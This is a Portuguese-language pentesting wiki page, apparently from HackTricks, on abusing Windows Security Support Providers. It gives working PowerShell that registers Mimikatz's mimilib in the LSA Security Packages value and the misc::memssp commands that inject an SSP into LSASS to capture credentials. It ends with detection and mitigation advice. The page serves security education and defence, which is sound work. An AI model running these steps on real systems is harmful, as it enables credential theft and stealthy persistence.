# Security Support Providers Personalizados

{{#include ../../banners/hacktricks-training.md}}

[Security Support Providers (SSPs)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) são pacotes de segurança baseados em DLL carregados pela Local Security Authority (LSA). O Windows registra DLLs SSP/AP personalizadas por meio do valor `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` e carrega os pacotes registrados quando o sistema é iniciado.<sup>[[1]](#references)</sup>

Como os SSPs são executados na LSA e podem receber credenciais, adversários podem abusar de um pacote malicioso para obter acesso a credenciais e garantir persistência. A MITRE rastreia esse comportamento como T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

O Mimikatz inclui `mimilib.dll`, que implementa um SSP que registra as credenciais processadas depois de ser carregado. Em um laboratório autorizado, coloque a DLL correspondente à arquitetura do alvo em `C:\Windows\System32` e, antes de alterá-la, inspecione a lista de pacotes atual.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Um valor existente típico pode conter pacotes como `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` e `pku2u`. Preserve todas as entradas existentes ao adicionar o pacote personalizado.<sup>[[1]](#references)</sup>

Anexe `mimilib` sem substituir os pacotes existentes:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Após uma reinicialização, o pacote é carregado no LSA, e as credenciais capturadas posteriormente são gravadas em `C:\Windows\System32\kiwissp.log` por esta implementação.<sup>[[2]](#references)[[3]](#references)</sup>

## Carregamento em memória

O Mimikatz também pode injetar sua implementação de SSP no processo LSASS atual:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Este método não persiste após uma reinicialização.<sup>[[2]](#references)[[3]](#references)</sup>

## Detection and Mitigation

Monitore alterações em `...\Lsa\Security Packages` e carregamentos inesperados de DLLs em `lsass.exe`. O evento de segurança 4657 registra apenas modificações de **valor** do registro quando a política de Auditoria do Registro relevante e a SACL estão configuradas.<sup>[[2]](#references)[[4]](#references)</sup>

Quando compatível, habilite a proteção adicional da LSA e investigue DLLs SSP não assinadas ou inesperadas. A Microsoft documenta especificamente a proteção da LSA como um controle contra injeção de código que poderia comprometer credenciais.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Registrando DLLs SSP/AP](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Repositório do Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Evento de segurança 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Configurar proteção adicional da LSA](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
